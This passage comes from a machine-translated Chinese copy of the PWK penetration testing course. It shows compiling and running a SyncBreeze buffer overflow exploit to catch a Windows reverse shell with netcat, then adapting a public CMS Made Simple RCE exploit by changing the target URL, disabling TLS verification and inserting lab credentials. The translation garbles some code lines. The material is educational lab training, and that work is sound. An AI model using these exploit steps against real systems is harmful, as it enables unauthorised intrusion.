<div style="position:absolute;top:31514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向shell，并启动漏洞利用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:31549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/Desktop$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</font></font></font></b></nobr></div>
<div style="position:absolute;top:31582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:31600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:31619;left:235"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 445 - 编译漏洞并在端口 443 上设置 Netcat 侦听器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将运行漏洞利用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:31683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/Desktop$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wine syncbreeze_exploit.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:31717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 初始化 Winsock...</font></font></nobr></div>
<div style="position:absolute;top:31734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 初始化。</font></font></nobr></div>
<div style="position:absolute;top:31751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 套接字已创建。</font></font></nobr></div>
<div style="position:absolute;top:31768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 已连接</font></font></nobr></div>
<div style="position:absolute;top:31802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 请求已发送</font></font></nobr></div>
<div style="position:absolute;top:31821;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 446 - 运行漏洞利用的最终版本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后切换到我们的 netcat 监听器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:31886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:31903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 49662 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:31919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.10240]</font></font></nobr></div>
<div style="position:absolute;top:31937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2015 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:31971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:31990;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 447 - 在 Kali Linux 机器上接收反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">我们有一个壳。</font><font style="vertical-align: inherit;">此外，此漏洞不再需要访问基于 Windows 的</font></font></nobr></div>
<div style="position:absolute;top:32039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域的攻击平台，因为我们可以从 Kali Linux 运行它。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:32123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">390 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Null-terminated_string</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:32251;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="28"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 28 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:32284;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:33361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:33361;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:33361;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">469</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:32380;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.7.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 修复溢出缓冲区，使得 EIP 寄存器将被您选择的返回覆盖</font></font></nobr></div>
<div style="position:absolute;top:32429;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址指令。</font></font></nobr></div>
<div style="position:absolute;top:32458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 安装</font><font style="vertical-align: inherit;">位于 C:\Tools\fixing_exploits 下</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASX to MP3 Converter</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序</font></font></nobr></div>
<div style="position:absolute;top:32477;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录; </font><font style="vertical-align: inherit;">从 EDB </font><font style="font-size:8px"><font style="vertical-align: inherit;">391</font></font><font style="vertical-align: inherit;">下载</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASX 到 MP3 转换器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的漏洞</font><font style="vertical-align: inherit;">并编辑它以</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:32496;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您的专用 Windows 机器上获取 shell。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:32533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2 修复网络漏洞</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序漏洞通常不会导致内存损坏。</font><font style="vertical-align: inherit;">这意味着他们是</font></font></nobr></div>
<div style="position:absolute;top:32594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不受 DEP 和 ASLR 等操作系统提供的保护的影响，并且它们是</font></font></nobr></div>
<div style="position:absolute;top:32614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更容易重新定位。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:32648;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:32648;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意事项和概述</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管我们可能不必在 Web 漏洞利用中处理十六进制编码的有效载荷，但这很重要</font></font></nobr></div>
<div style="position:absolute;top:32706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正确阅读代码以了解在我们的编辑中必须考虑哪些因素</font></font></nobr></div>
<div style="position:absolute;top:32725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程。</font></font></nobr></div>
<div style="position:absolute;top:32758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在修改 Web 漏洞时，我们通常需要询问几个关键问题</font></font></nobr></div>
<div style="position:absolute;top:32777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接近代码：</font></font></nobr></div>
<div style="position:absolute;top:32810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:32810;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它是否启动 HTTP 或 HTTPS 连接？</font></font></nobr></div>
<div style="position:absolute;top:32838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:32838;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它是否访问特定于 Web 应用程序的路径或路由？</font></font></nobr></div>
<div style="position:absolute;top:32867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:32867;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该漏洞利用是否利用了预身份验证漏洞？</font></font></nobr></div>
<div style="position:absolute;top:32895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:32895;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果没有，漏洞利用如何对 Web 应用程序进行身份验证？</font></font></nobr></div>
<div style="position:absolute;top:32923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:32923;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如何精心制作 GET 或 POST 请求以触发和利用该漏洞？</font></font></nobr></div>
<div style="position:absolute;top:32951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:32951;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是否依赖于默认应用程序设置（例如应用程序的 Web 路径）</font></font></nobr></div>
<div style="position:absolute;top:32971;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装后有变化吗？</font></font></nobr></div>
<div style="position:absolute;top:32999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:32999;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自签名证书等奇怪的东西会破坏漏洞利用吗？</font></font></nobr></div>
<div style="position:absolute;top:33032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，我们必须记住，公共 Web 应用程序的漏洞没有考虑到</font></font></nobr></div>
<div style="position:absolute;top:33052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">附加保护，例如 .htaccess。</font><font style="vertical-align: inherit;">这主要是因为漏洞利用作者不可能</font></font></nobr></div>
<div style="position:absolute;top:33071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在开发过程中了解这些保护措施，并且它们不受漏洞利用的影响</font></font></nobr></div>
<div style="position:absolute;top:33090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">范围。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33125;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:33125;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们考虑以下场景。</font><font style="vertical-align: inherit;">在评估期间，我们发现一台 Linux 主机具有</font></font></nobr></div>
<div style="position:absolute;top:33182;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apache2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器暴露。</font><font style="vertical-align: inherit;">枚举web服务器后，我们发现安装了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMS Made</font></font></i></nobr></div>
<div style="position:absolute;top:33201;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.2.5</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听 TCP 端口</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">443</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">此版本似乎易受远程攻击</font></font></nobr></div>
<div style="position:absolute;top:33221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exploit-DB 上提供了代码执行和公共漏洞利用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">392</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:33291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">391 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2015 年），https://www.exploit-db.com/exploits/38457/</font></font></font></nobr></div>
<div style="position:absolute;top:33311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">392 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2018 年），https://www.exploit-db.com/exploits/44976</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:33439;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="29"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 29 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:33472;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:34549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:34549;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:34549;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">470</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此漏洞是经过身份验证的，但是，我们发现了有效的应用程序凭据</font></font></nobr></div>
<div style="position:absolute;top:33587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(admin / HUYfaw763) 在枚举过程中在另一台机器上。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33622;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:33622;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改连接信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们检查代码时，我们意识到</font><font style="vertical-align: inherit;">需要更改</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">base_url</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量以匹配我们的</font></font></nobr></div>
<div style="position:absolute;top:33679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:33714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">base_url = "http://192.168.1.10/cmsms/admin"</font></font></nobr></div>
<div style="position:absolute;top:33733;left:282"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 448 - 原始漏洞利用中定义的 base_url 变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们必须将 IP 地址和协议修改为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTPS</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:33798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">base_url = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"https://10.11.0.128/admin"</font></font></font></b></nobr></div>
<div style="position:absolute;top:33817;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 449 - 更新 base_url 变量以匹配我们的案例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还注意到，在浏览目标网站时，我们会看到一个</font></font></nobr></div>
<div style="position:absolute;top:33866;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SEC_ERROR_UNKNOWN_ISSUER </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">393</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误。</font><font style="vertical-align: inherit;">此错误表示远程证书上的</font></font></nobr></div>
<div style="position:absolute;top:33885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机无法验证。</font><font style="vertical-align: inherit;">我们需要在漏洞利用代码中考虑到这一点。</font></font></nobr></div>
<div style="position:absolute;top:33918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具体来说，该漏洞利用</font><font style="vertical-align: inherit;">Python 库</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与目标进行通信。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:33937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码在第 34、55 和 80 行发出三个 post 请求：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:33972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:33989;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, allow_redirects=False)</font></font></nobr></div>
<div style="position:absolute;top:34006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:34023;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, files=txt, cookies=cookies)</font></font></nobr></div>
<div style="position:absolute;top:34040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:34057;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)</font></font></nobr></div>
<div style="position:absolute;top:34074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:34093;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 450 - 原始漏洞利用中定义的所有三个 post 请求</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">官方文档</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">394</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示如果我们设置了</font><i><font style="vertical-align: inherit;">verify</font></i><font style="vertical-align: inherit;">，SSL证书会被忽略</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:34142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">False</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:34177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:34194;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, allow_redirects=False, </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">verify=False</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:34210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:34227;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, files=txt, cookies=cookies, </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">verify=False</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:34244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:34262;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:34279;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">验证=假</font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:34295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:34315;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 451 - 修改了 post 请求以忽略 SSL 验证。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们还需要更改原始漏洞利用中使用的凭据以匹配找到的凭据</font></font></nobr></div>
<div style="position:absolute;top:34363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在枚举过程中。</font><font style="vertical-align: inherit;">这些是在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">中定义的</font></font></nobr></div>
<div style="position:absolute;top:34383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别为 15 和 16：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:34479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">393 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019），https://support.mozilla.org/en-US/kb/error-codes-secure-websites?as=u&amp;utm_source=inproduct</font></font></font></nobr></div>
<div style="position:absolute;top:34499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">394 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（python-requests.org，2019），http://docs.python-requests.org/en/master/user/advanced/#ssl-cert-verification</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:34627;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="30"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 30 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:34660;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:35737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:35737;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:35737;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">471</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:34758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名 = "管理员"</font></font></nobr></div>
<div style="position:absolute;top:34775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码 = "密码"</font></font></nobr></div>
<div style="position:absolute;top:34794;left:231"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 452 - 原始漏洞利用中定义的用户名和密码变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以轻松替换这些凭据：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:34858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名 = “</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">”</font></font></nobr></div>
<div style="position:absolute;top:34875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码 = " </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HUYfaw763</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> "</font></font></nobr></div>
<div style="position:absolute;top:34895;left:233"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 453 - 更新用户名和密码变量以匹配我们的场景</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，在这种情况下，我们不需要更新简单的有效负载，因为它只执行系统</font></font></nobr></div>
